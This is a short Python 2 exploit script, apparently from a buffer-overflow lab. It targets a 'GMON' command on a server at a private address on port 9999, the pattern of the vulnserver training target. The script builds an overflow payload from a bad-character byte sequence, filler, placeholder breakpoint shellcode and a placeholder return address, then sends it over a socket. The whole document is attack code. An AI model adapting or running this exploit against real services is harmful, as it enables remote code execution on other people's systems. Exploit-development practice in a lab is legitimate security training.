#!/usr/bin/python
import socket
server = '10.121.0.24'
sport = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)

chars = ''
for i in range(1,10):
   chars += chr(i)
for i in range(11,13):
   chars += chr(i)
for i in range(13,255):
   chars += chr(i)

letters1 = 'B' * 11 * 253
skip = 'B' * 228
shellcode = '\xCC\xCC\xCC\xCC'
eip = '1234'
padding = 'F' * (253 - 228 - 4 - 4)
letters2 = 'F' * 2 * 253

prefix = 'A' * 253 + chars + letters1 + skip
attack = prefix + shellcode + eip + padding + letters2

s.send(('GMON ' + attack + '\r\n'))
print s.recv(1024)

s.send('EXIT\r\n')
print s.recv(1024)
s.close()
